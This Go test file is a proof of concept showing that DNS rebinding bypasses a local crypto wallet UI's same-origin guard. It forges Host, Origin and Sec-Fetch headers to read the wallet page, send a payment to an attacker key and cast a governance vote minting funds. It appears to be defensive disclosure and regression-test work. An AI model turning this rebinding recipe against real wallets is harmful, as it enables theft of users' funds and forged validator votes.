package main

// PoC — DNS rebinding bypasses the cross-site guard (ui/main.go:62-86).
//
// A page at http://rebind.attacker.example:8090/ whose DNS name the attacker re-points to 127.0.0.1
// after load (TTL 0; e.g. Singularity-of-Origin style) is, to the browser, SAME-ORIGIN with the
// wallet afterwards. Its fetch("/send", {method:"POST", body:"to=..&amount=.."}) reaches the wallet
// on 127.0.0.1:8090 carrying
//     Host:   rebind.attacker.example:8090
//     Origin: http://rebind.attacker.example:8090
// and NO Sec-Fetch-* headers (browsers send Sec-Fetch-* only to potentially-trustworthy URLs; an
// http:// non-localhost name is not one). sameOrigin() only checks Origin.Host == r.Host, which a
// rebinding attacker satisfies by construction, so the request is treated as the local operator's.
// The wallet then signs and submits a payment to the attacker (and, for a validator wallet, a
// governance vote) with the local key. Because the attacker page is same-origin after the rebind it
// can also READ GET / (balance, public key) to size the drain exactly.
//
// The test drives the real handlers through the real guard, wired exactly as main() wires them.
// It asserts the SECURE behaviour, so on the current code it FAILS and logs what was signed.

import (
	"encoding/json"
	"html"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"

	"github.com/eval-apply-labs/go-ledger/ledger"
)

// walletMux reproduces main()'s route table (main builds it inline).
func walletMux(w *Wallet) *http.ServeMux {
	h := &handler{w: w}
	mux := http.NewServeMux()
	mux.HandleFunc("/", h.index)
	mux.HandleFunc("/admin", h.admin)
	mux.HandleFunc("/send", guard(h.send))
	mux.HandleFunc("/register", guard(h.register))
	mux.HandleFunc("/admin/parameter", guard(h.proposeParameter))
	mux.HandleFunc("/admin/reassignment", guard(h.voteReassignment))
	return mux
}

type recordingNode struct {
	mu            sync.Mutex
	payments      []ledger.Payment
	reassignments []ledger.Reassignment
}

func newRecordingNode(t *testing.T, validators func() []string) (*httptest.Server, *recordingNode) {
	t.Helper()
	rec := &recordingNode{}
	node := testNodeSigner(t)
	mux := http.NewServeMux()
	mux.HandleFunc("/hdls/status", func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]int64{"height": 10})
	})
	mux.HandleFunc("/hdls/accounts", func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode([]ledger.Account{})
	})
	mux.HandleFunc("/hdls/governance", func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]any{
			"validators": append(validators(), node.PublicKeyBase64()), "transactionCost": "1/10",
			"stepTimeoutMs": 3000, "governanceSequence": 0,
		})
	})
	mux.HandleFunc("/hdls/pay", func(w http.ResponseWriter, r *http.Request) {
		var p ledger.Payment
		_ = json.NewDecoder(r.Body).Decode(&p)
		rec.mu.Lock()
		rec.payments = append(rec.payments, p)
		rec.mu.Unlock()
		receipt, _ := ledger.SignReceipt(node, p)
		_ = json.NewEncoder(w).Encode(receipt)
	})
	mux.HandleFunc("/hdls/reassignment-vote", func(w http.ResponseWriter, r *http.Request) {
		var ra ledger.Reassignment
		_ = json.NewDecoder(r.Body).Decode(&ra)
		rec.mu.Lock()
		rec.reassignments = append(rec.reassignments, ra)
		rec.mu.Unlock()
		w.WriteHeader(http.StatusAccepted)
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv, rec
}

func TestPoCDNSRebindingBypassesGuard(t *testing.T) {
	var wallet *Wallet
	nodeSrv, rec := newRecordingNode(t, func() []string { return []string{wallet.PublicKey()} })
	wallet = newTestWallet(t, nodeSrv.URL)
	ui := httptest.NewServer(walletMux(wallet)) // listens on 127.0.0.1:<port>, like -listen 127.0.0.1:8090
	defer ui.Close()
	port := ui.URL[strings.LastIndex(ui.URL, ":")+1:]
	rebound := "rebind.attacker.example:" + port // the attacker's DNS name, now resolving to 127.0.0.1
	attacker := testNodeSigner(t).PublicKeyBase64()

	client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	post := func(path string, form url.Values) *http.Response {
		req, _ := http.NewRequest("POST", ui.URL+path, strings.NewReader(form.Encode()))
		req.Host = rebound                          // what the browser sends after the rebind
		req.Header.Set("Origin", "http://"+rebound) // same-origin from the browser's viewpoint
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		// After the rebind the page origin and the request URL ARE the same origin, so a modern
		// browser honestly computes Sec-Fetch-Site: same-origin — which the guard treats as trusted.
		// (A browser that omits Sec-Fetch-* for a non-trustworthy http:// origin bypasses it just as
		// well, via the Origin==Host branch; either way the guard passes.)
		req.Header.Set("Sec-Fetch-Site", "same-origin")
		resp, err := client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		return resp
	}

	// 1. read side: the attacker page can read the wallet page (public key, balance) same-origin.
	req, _ := http.NewRequest("GET", ui.URL+"/", nil)
	req.Host = rebound
	resp, err := client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode == http.StatusOK && strings.Contains(html.UnescapeString(string(body)), wallet.PublicKey()) {
		t.Errorf("rebound GET / served the wallet page (status 200, contains the wallet key) to Host %q", rebound)
	}

	// 2. drain: a payment to the attacker, signed with the local key.
	resp = post("/send", url.Values{"to": {attacker}, "amount": {"999"}})
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("rebound POST /send: status %d, want 403 (guard should reject Host %q)", resp.StatusCode, rebound)
	}
	// 3. governance: a reassignment vote minting to the attacker, signed with the (validator) key.
	resp = post("/admin/reassignment", url.Values{"account": {attacker}, "amount": {"1000000"}})
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("rebound POST /admin/reassignment: status %d, want 403", resp.StatusCode)
	}

	rec.mu.Lock()
	defer rec.mu.Unlock()
	for _, p := range rec.payments {
		if ledger.VerifyPayment(signingScheme(), "testnet", p) {
			t.Errorf("BYPASS: node received a VALID payment signed by the wallet key: from=%s… to=%s… amount=%s block=%d",
				first(p.PublicKeyFrom, 12), first(p.PublicKeyTo, 12), p.Amount.RatString(), p.BlockID)
		}
	}
	for _, ra := range rec.reassignments {
		for _, v := range ra.Votes {
			if ledger.VerifyReassignmentVote(signingScheme(), "testnet", ra.Account, ra.PreviousAmount, ra.NewAmount, ra.Sequence, v) {
				t.Errorf("BYPASS: node received a VALID reassignment vote by the wallet key: set %s… to %s",
					first(ra.Account, 12), ra.NewAmount.RatString())
			}
		}
	}
}
